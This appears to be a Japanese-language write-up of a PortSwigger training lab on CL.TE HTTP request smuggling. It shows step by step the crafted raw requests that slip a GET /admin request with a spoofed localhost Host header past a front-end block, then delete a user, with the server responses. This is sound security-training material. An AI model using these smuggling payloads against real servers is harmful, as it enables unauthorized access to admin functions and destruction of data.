# HTTP リクエストの密輸を悪用してフロントエンドのセキュリティ制御、CL.TE の脆弱性をバイパスする

次のラボを実施します  
https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te  
このラボにはフロントエンド サーバーとバックエンド サーバーが含まれますが、フロントエンド サーバーはチャンク エンコーディングをサポートしていません。

- 1.  Burp Suite を起動して、proxy タブからブラウザを立ち上げます

* 2. ブラウザからハッキングラボにアクセスします

- 3. GET / リクエストを send to repeater します

* 4. GET /admin に書き換えてリクエストを送信します

```
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 24

"Path /admin is blocked"
```

- 5. Repeater のリクエストを表示した状態で右クリックして change to request を選択して、POST リクエストに切り替えます

* 6. Setting で Repeater の Update content length のチェックボックスを外します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/8b1031a6-e20f-4f61-b906-8b54d6d8a882)

* 7. inspector で http/1 に設定します

* 8. リクエストを以下のように書き換えて 2 回送信します

```
POST / HTTP/1.1
Host: 0aaa007a04f97fda81fec0c500390080.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X

```

2 回目のレスポンスで以下情報が得られます

```
Admin interface only available to local users
```

フロントエンドはチャンクをサポートしていないので、初回リクエストで 2 回リクエスト処理がされており、2 回目のリクエスト時に GET /admin の結果が得られます

- 9. ローカルユーザーとしてアクセスできるように Host ヘッダーを追加して、2 回送信

```
POST / HTTP/1.1
Host: 0aaa007a04f97fda81fec0c500390080.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X


```

2 回目のレスポンスで以下情報が得られます

```
"error":"Duplicate header names are not allowed"
```

- 10. 2 番目のリクエストが 2 回目のペイロードに入るようにリクエストを修正して 2 回送信。

```
POST / HTTP/1.1
Host: 0aaa007a04f97fda81fec0c500390080.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

2 回目のレスポンスでユーザー削除リンクが得られます

```html
<div>
  <span>carlos - </span>
  <a href="/admin/delete?username=carlos">Delete</a>
</div>
```

- 11. ユーザーを削除するようにリクエストを書き換えて 2 回送信。

```
HTTP/1.1 302 Found
Location: /admin
Set-Cookie: session=KR19QT4N5Cb8pLra2papvQTfpOzDUAts; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0
```

2 回目のレスポンス

```
HTTP/1.1 302 Found
Location: /admin
Set-Cookie: session=KR19QT4N5Cb8pLra2papvQTfpOzDUAts; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 0

```

ユーザーの削除ができました
